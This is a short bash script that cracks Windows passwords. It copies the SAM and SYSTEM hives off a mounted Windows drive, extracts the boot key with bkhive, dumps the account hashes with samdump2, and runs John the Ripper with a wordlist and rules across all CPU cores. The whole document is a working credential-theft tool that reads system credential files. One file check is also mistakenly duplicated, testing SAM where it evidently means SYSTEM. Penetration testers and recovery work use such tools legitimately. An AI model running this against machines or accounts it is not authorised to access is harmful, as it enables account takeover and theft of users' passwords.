#!/bin/bash

ShowUsage() {
	echo ""
	echo "Usage: $0 <copied sam dir> [mounted Windows drive directory]"
	echo ""
	echo "$0 will attempt to crack a SAM file copied from a Windows system."
	echo "<copied sam dir> specifies the location of the SAM and SYSTEM hives copied off the system."
	echo ""
	echo "If a mounted Windows drive directory is provided, $0 will copy the files from there to <copied sam dir> first."
	echo ""
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

SAMDIR=$1

if [ ! -e $SAMDIR ]; then
	echo "ERROR: Unable to find $SAMDIR"
	exit 5
fi

if [ $# -gt 1 ]; then
	WINCONFIGDIR=$2
	if [ ! -e $WINCONFIGDIR/SAM ]; then
		echo "ERROR: Unable to find $WINCONFIGDIR/SAM"
		exit 2
	fi

	echo "Copying files from $WINCONFIGDIR to $SAMDIR..."
	cp $WINCONFIGDIR/SAM $SAMDIR
	cp $WINCONFIGDIR/SYSTEM $SAMDIR
fi

if [ ! -e $SAMDIR/SAM ]; then
	echo "ERROR: Unable to find $SAMDIR/SAM"
	exit 3
fi

if [ ! -e $SAMDIR/SAM ]; then
	echo "ERROR: Unable to find $SAMDIR/SYSTEM"
	exit 4
fi

cd $SAMDIR
echo "Extracting boot key..."
bkhive SYSTEM bootkey

if [ ! -e bootkey ]; then
	echo "ERROR: Unable to extract boot key."
	exit 6
fi

samdump2 SAM bootkey > sam_hashes.txt

if [ ! -e sam_hashes.txt ] ;then
	echo "ERROR: Unable to extract hashes."
	exit 7
fi

NUMHASHES=`cat sam_hashes.txt | wc -l`

if [ $NUMHASHES -eq 0 ]; then
	echo "ERROR: No hashes in hash file."
	exit 8
fi

NUMCORES=`cat /proc/cpuinfo | awk '/^processor/{print $3}' | wc -l`

echo "Cracking hashes with john..."
cd /opt/john/1.8-MultiCore
./john --wordlist=/opt/wordlists/MikesList.wordlist.txt --rules --fork=$NUMCORES $SAMDIR/sam_hashes.txt

